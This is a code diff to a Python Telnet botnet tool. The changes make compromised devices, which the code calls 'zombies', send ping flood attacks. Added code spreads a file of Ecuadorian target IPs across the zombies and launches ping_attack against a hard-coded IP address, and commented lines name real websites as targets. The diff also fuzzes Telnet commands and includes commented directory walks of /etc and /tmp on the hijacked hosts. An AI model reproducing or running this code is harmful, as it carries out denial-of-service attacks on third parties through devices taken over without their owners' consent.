@@ -17,7 +17,9 @@ from utils.colors import Colors
 from sockets.sconnection import telnet_auth_sequence, socket_send_data, socket_send_sequence, socket_send_command
 from parsing.wap_commands import pseudo_tree
 from commands.telnet_combinations import *
-from commands.fuzzing_combinations import fuzz_netstat, fuzz_ansi, fuzz_terminal_type, fuzz_ftp
+#from commands.fuzzing_combinations import fuzz_netstat, fuzz_ansi, fuzz_terminal_type, fuzz_ftp, fuzz_tree, fuzz_arping, fuzz_special_chars, scan_ping, scan_ping2, attack_ping
+from commands.fuzzing_combinations import *
+from commands.ping_combinations import ping_attack
 
 # Global variable to track remote sockets
 remote_sockets = []
@@ -47,7 +49,7 @@ def parse_arguments():
     parser.add_argument("-i", "--ip", help="\t\tTarget IP address or hostname to authenticate with.")
     parser.add_argument("-p", "--port", default=23, type=int, help="\t\tTarget port (default is 23 for Telnet).")
     parser.add_argument("-l", "--login", action="store_true", help="\tSimply login on the target system.")
-    parser.add_argument("-v", "--victim", help="\tTarget victim for sending attacks (IP or domain name).")
+    parser.add_argument("-v", "--victim", help="\tTarget victim for sending attacks (IP collection or domain name).")
     return parser.parse_args()
 
 
@@ -71,11 +73,15 @@ def main():
             # Retrieve fuzz list
             #commands_seq = fuzz_netstat(1000000)
             #commands_seq = fuzz_ansi()
-            commands_seq = fuzz_terminal_type()
-            #commands_seq = fuzz_ftp()
+            #commands_seq = fuzz_terminal_type()
+            commands_seq = fuzz_ftp()
+            #commands_seq = fuzz_tree()
+            #commands_seq = fuzz_arping()
+            #commands_seq = fuzz_special_chars()
+            
 
             # Handle single session
-            handle_target(args.ip, args.port, commands_seq24, 0.2, True) # Log executed commands with True
+            handle_target(args.ip, args.port, commands_seq29, 0.1, True) # Log executed commands with True
 
 
     # Option -iL is provided
@@ -91,15 +97,43 @@ def main():
         # Close the read file properly
         file.close()
 
+        # Construct the ping commands
+        ecuador_ips = ""
+        if args.victim and os.path.exists(args.victim) is True:
+            #ecuador_ips = "/mnt/Kali/home/grimaldi/Bash/Telnet/pynet/split/ecuador_ips.txt"
+            ecuador_ips = os.path.join(args.victim)
+
+            total_targets = 0
+            with open(ecuador_ips, 'r') as file:
+                for line in file:
+                    total_targets += 1
+
+            total_zombies = len(ip_addresses)
+            targets_per_zombie = int(total_targets/total_zombies)
+            print(f"[!] Total Zombies:\n\t[{total_zombies}]")
+            print(f"[!] Total Targets:\n\t[{total_targets}]")
+            print(f"[!] Total Targets per Zombie:\n\t[{targets_per_zombie}]")
+
+            # Obtain the list of lists
+            commands_list = scan_ping2(total_zombies, ecuador_ips, total_targets)
+
         ip_cont = 1
         for ip in ip_addresses:
 
             # Simply perform a telnet connection.
             if args.login:
                 print(Colors.BOLD_WHITE + f"[{ip_cont}] Processing IP:\t[{ip}]" + Colors.R)
+                ip_cont += 1
+
+                # Fetch the respective list with ping commands
+                #commands = commands_list.pop()
+                #commands = attack_ping("dnschecker.org", 100)
+                #commands_attack = ping_attack("caliente.mx", 1000)
+                commands_attack = ping_attack("45.8.148.88", 1000)
+
 
                 # Spin up our client thread to handle incoming data
-                target_handler = threading.Thread(target=handle_target, args=(ip, args.port, commands_seq24, 0.2, True))
+                target_handler = threading.Thread(target=handle_target, args=(ip, args.port, commands_attack, 0.1, True))
                 try:
                     target_handler.start()
                 except:
@@ -109,7 +143,7 @@ def main():
                 delay = 1
                 time.sleep(delay)
 
-            ip_cont += 1
+            #ip_cont += 1
 
     # Error case
     else:
@@ -144,6 +178,8 @@ def handle_target(ip, port, command_sequence, timeout=2, detail=True):
     #print(response)
 
     #pseudo_tree(remote_socket, "/var", 3, log_output, log_paths)
+    #pseudo_tree(remote_socket, "/tmp", 3, log_output, log_paths)
+    #pseudo_tree(remote_socket, "/etc", 3, log_output, log_paths)
 
     # Close the socket after command execution
     if remote_socket:
